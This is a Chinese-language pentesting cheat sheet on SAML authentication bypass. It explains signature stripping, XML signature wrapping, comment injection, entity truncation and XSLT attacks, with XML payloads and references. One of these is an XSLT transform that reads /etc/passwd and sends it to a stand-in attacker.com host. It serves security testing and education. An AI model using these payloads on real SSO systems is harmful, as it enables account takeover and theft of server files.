# SAML 注入

> 安全断言标记语言（SAML）是一个开放标准，允许跨网络的多台计算机共享安全凭据。在使用基于 SAML 的单点登录（SSO）时，涉及到三个不同的角色。有一个用户（所谓的主体）、一个身份提供者（IDP）和一个云应用程序服务提供者（SP）。- centrify

## 摘要

* [工具](#工具)
* [认证绕过](#认证绕过)
  * [无效签名](#无效签名)
  * [签名剥离](#签名剥离)
  * [XML 签名包装攻击](#xml-签名包装攻击)
  * [XML 注释处理](#xml-注释处理)
  * [XML 外部实体](#xml-外部实体)
  * [可扩展样式表语言转换](#可扩展样式表语言转换)

## 工具

- [SAML Raider - Burp 扩展](https://github.com/SAMLRaider/SAMLRaider)
- [SAML 支持 - ZAP 插件](https://www.zaproxy.org/docs/desktop/addons/saml-support/)

## 认证绕过

SAML 响应应包含 `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`。

### 无效签名

未经真实 CA 签名的签名容易受到克隆。确保签名由真实 CA 签名。如果证书是自签名的，您可能能够克隆证书或创建自己的自签名证书来替换它。

### 签名剥离

> [...]接受未签名的 SAML 断言相当于接受一个未检查密码的用户名 - @ilektrojohn

目标是在不签名的情况下伪造一个格式良好的 SAML 断言。对于某些默认配置，如果从 SAML 响应中省略签名部分，则不执行签名验证。

示例：未签名的 SAML 断言，其中 `NameID=admin`。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
    <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
    <saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
        <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
    </saml2p:Status>
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
        <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
        <saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
            <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
            </saml2:SubjectConfirmation>
        </saml2:Subject>
        <saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AudienceRestriction>
                <saml2:Audience>WLS_SP</saml2:Audience>
            </saml2:AudienceRestriction>
        </saml2:Conditions>
        <saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml2:AuthnContext>
                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
            </saml2:AuthnContext>
        </saml2:AuthnStatement>
    </saml2:Assertion>
</saml2p:Response>
```

### XML签名包装攻击

XML签名包装（XSW）攻击中，一些实现检查有效的签名并将其与有效断言匹配，但不检查多个断言、多个签名，或者根据断言的顺序表现出不同的行为。

- XSW1 - 适用于SAML响应消息。在现有签名后添加一个克隆的未签名响应副本。
- XSW2 - 适用于SAML响应消息。在现有签名前添加一个克隆的未签名响应副本。
- XSW3 - 适用于SAML断言消息。在现有断言前添加一个克隆的未签名断言副本。
- XSW4 - 适用于SAML断言消息。在现有断言内添加一个克隆的未签名断言副本。
- XSW5 - 适用于SAML断言消息。更改已签名断言副本中的值，并在SAML消息末尾添加一个移除签名的原始断言副本。
- XSW6 - 适用于SAML断言消息。更改已签名断言副本中的值，并在原始签名后添加一个移除签名的原始断言副本。
- XSW7 - 适用于SAML断言消息。添加一个包含克隆的未签名断言的“扩展”块。
- XSW8 - 适用于SAML断言消息。添加一个包含移除签名的原始断言副本的“对象”块。

在以下示例中，使用了以下术语。

- FA：伪造断言
- LA：合法断言
- LAS：合法断言的签名

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>攻击者</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>合法用户</Subject>
      <LAS>
         <Reference Reference URI="legitimate">
         </Reference>
      </LAS>
  </LA>
</SAMLResponse>
```

在Github企业版漏洞中，即使`FA`未被签名，这个请求也会验证并为`攻击者`创建会话，而不是`合法用户`。

### XML注释处理

已经通过认证访问SSO系统的威胁行为者可以在不需要个人SSO密码的情况下作为另一个用户进行身份验证。此[漏洞](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png)在以下库和产品中有多个CVE。

- OneLogin - python-saml - CVE-2017-11427
- OneLogin - ruby-saml - CVE-2017-11428
- Clever - saml2-js - CVE-2017-11429
- OmniAuth-SAML - CVE-2017-11430
- Shibboleth - CVE-2018-0489
- Duo Network Gateway - CVE-2018-7340

研究人员注意到，如果攻击者在用户名字段内插入注释，以破坏用户名的方式，攻击者可能会获得合法用户账户的访问权限。

```xml
<SAMLResponse>
    <Issuer>https://idp.com/</Issuer>
    <Assertion ID="_id1234">
        <Subject>
            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```

其中`user@user.com`是用户名的第一部分，`.evil.com`是第二部分。

### XML外部实体

另一种利用方法是使用`XML实体`来绕过签名验证，因为内容在XML解析期间不会改变。

在以下示例中：

- `&s;` 将解析为字符串 `"s"`
- `&f1;` 将解析为字符串 `"f1"`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
  ID="_04cfe67e596b7449d05755049ba9ec28"
  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
[...]
  <saml2:Attribute FriendlyName="uid"
    Name="urn:oid:0.9.2342.19200300.100.1.1"
    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
    <saml2:AttributeValue>
      &s;taf&f1;
    </saml2:AttributeValue>
  </saml2:Attribute>
[...]
</saml2p:Response>
```

SAML响应被服务提供者接受。由于漏洞，服务提供者应用程序报告"taf"作为"uid"属性的值。

### 可扩展样式表语言转换

可以通过使用`transform`元素来执行XSLT。

![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)    
图片来源于 [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)    

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

## 参考资料

- [SAML Burp Extension - ROLAND BISCHOFBERGER - JULY 24, 2015](https://blog.compass-security.com/2015/07/saml-burp-extension/)
- [The road to your codebase is paved with forged assertions - @ilektrojohn - March 13, 2017](http://www.economyofmechanism.com/github-saml)
- [SAML_Security_Cheat_Sheet.md - OWASP](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
- [On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)
- [Making Headlines: SAML - March 19, 2018 - Torsten George](https://blog.centrify.com/saml/)
- [Vulnerability Note VU#475445 - 2018-02-27 - Carnegie Mellon University](https://www.kb.cert.org/vuls/id/475445/)
- [ORACLE WEBLOGIC - MULTIPLE SAML VULNERABILITIES (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - Jul 18, 2018](https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
- [Truncation of SAML Attributes in Shibboleth 2 - 2018-01-15 - redteam-pentesting.de](https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
- [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - March 7th, 2017 - Jem Jensen](https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
- [How to Hunt Bugs in SAML; a Methodology - Part I - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [How to Hunt Bugs in SAML; a Methodology - Part II - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
- [How to Hunt Bugs in SAML; a Methodology - Part III - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
